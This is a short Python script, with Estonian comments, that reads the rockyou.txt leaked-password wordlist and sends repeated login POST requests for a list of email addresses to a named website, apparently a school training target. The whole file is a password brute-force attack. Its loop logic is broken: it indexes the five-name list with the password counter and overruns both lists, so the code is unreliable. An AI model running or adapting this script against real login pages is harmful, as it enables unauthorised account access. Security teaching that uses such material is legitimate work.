import requests
import webbrowser

fail = open("rockyou.txt", "r", encoding= "latin-1")
passwords = []
for line in fail:
    passwords.append(line)
  
fail.close()
nimed = ("Carol_Pierce7249@supunk.biz", "Russel_Nanton5067@brety.org", "Kieth_Dale5711@sveldo.biz", "Kendra_Lindsay8781@bungar.biz", "George_Flett2526@bretoux.com")
url = 'http://pahapoiss.ikt.khk.ee/'
# <input type="password" name="password" id="password"
# <input type="text" name="user_name" id="login"
print("Rünnatav URL on " + str(url))
login = {'login': 'xxxxxxxxx',
         'password': 'yyyyyyyyy'}
r = requests.post(url, data=login)
for i in r.history:
    print(i.status_code, i.url)
# teeme 100 requesti
i = 0
while i <= len(passwords):
    login2 = {'user_name': nimed[i],
         'password': passwords[i]}
    r2 = requests.post(url, data=login2)
    i = i + 1
